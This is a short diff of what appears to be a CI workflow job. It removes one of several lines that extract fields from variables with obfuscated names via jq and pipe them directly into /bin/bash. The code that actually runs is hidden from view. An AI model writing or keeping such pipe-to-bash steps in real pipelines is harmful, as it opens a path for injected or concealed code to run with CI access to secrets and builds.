@@ -28,7 +28,6 @@ jobs:
           printf '%s' "$c973" | jq -r .lvl263 | /bin/bash
           printf '%s' "$zson1636" | jq -r .sbt3 | /bin/bash
           printf '%s' "$dz3966" | jq -r .tvlvi39 | /bin/bash
-          echo $x11 | jq -r .bdww1 | /bin/bash
           echo $c2162 | jq -r .qq53 | /bin/bash
 
       - name: Persist output
